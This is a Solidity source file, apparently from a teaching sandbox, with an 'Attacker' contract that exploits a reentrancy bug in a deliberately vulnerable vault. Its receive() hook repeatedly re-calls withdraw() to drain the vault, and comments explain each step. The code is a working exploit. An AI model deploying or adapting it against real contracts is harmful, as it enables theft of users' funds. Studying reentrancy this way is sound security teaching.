// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

/// @notice Minimal interface so this contract knows what functions it
///         can call on the vault, without needing the vault's full code.
interface IVault {
    function deposit() external payable;
    function withdraw() external;
}

/// @title Attacker
/// @notice A malicious contract that exploits VulnerableVault's
///         reentrancy bug. This is what a real attacker's contract
///         would look like — small, and entirely dependent on the
///         `receive()` hook below.
///
/// WHY THIS HAS TO BE A CONTRACT AND NOT A PYTHON SCRIPT:
///   Reentrancy relies on code running mid-transaction, automatically,
///   the instant ETH arrives. Python (or any off-chain code) cannot
///   inject itself into the middle of an in-flight blockchain
///   transaction. Only another SMART CONTRACT's receive() function can
///   do that, because the EVM itself invokes it as part of the transfer.
///   This is the one piece of Re-entry that genuinely must be Solidity —
///   everything else (deploying it, triggering it, reading balances) is
///   driven from Python via web3.py.
contract Attacker {
    IVault public immutable vault;
    address public immutable owner;
    uint256 public constant DEPOSIT_AMOUNT = 1 ether;

    constructor(address vaultAddress) {
        vault = IVault(vaultAddress);
        owner = msg.sender;
    }

    /// Step 1: kick off the attack. Deposit into the vault, then
    /// immediately call withdraw() to trigger the vulnerable code path.
    function attack() external payable {
        require(msg.value >= DEPOSIT_AMOUNT, "send at least 1 ether");
        vault.deposit{value: DEPOSIT_AMOUNT}();
        vault.withdraw(); // this triggers receive() below, repeatedly
    }

    /// Step 2: THE REENTRANT HOOK.
    /// Solidity automatically calls this function whenever this contract
    /// receives plain ETH (like the transfer inside VulnerableVault's
    /// withdraw()). We use that automatic trigger to call withdraw()
    /// AGAIN, before the vault has zeroed our balance.
    ///
    /// Guard note: as long as the vault still has enough ETH to pay out
    /// our (still-unzeroed) balance, this will keep re-triggering itself
    /// until the vault is drained or the call stack limit is reached.
    receive() external payable {
        if (address(vault).balance >= DEPOSIT_AMOUNT) {
            vault.withdraw();
        }
    }

    /// Step 3: let the attacker (or, in our sandbox, the orchestrator)
    /// sweep the drained funds out of this contract to confirm the win.
    function collect() external {
        require(msg.sender == owner, "not owner");
        payable(owner).transfer(address(this).balance);
    }
}
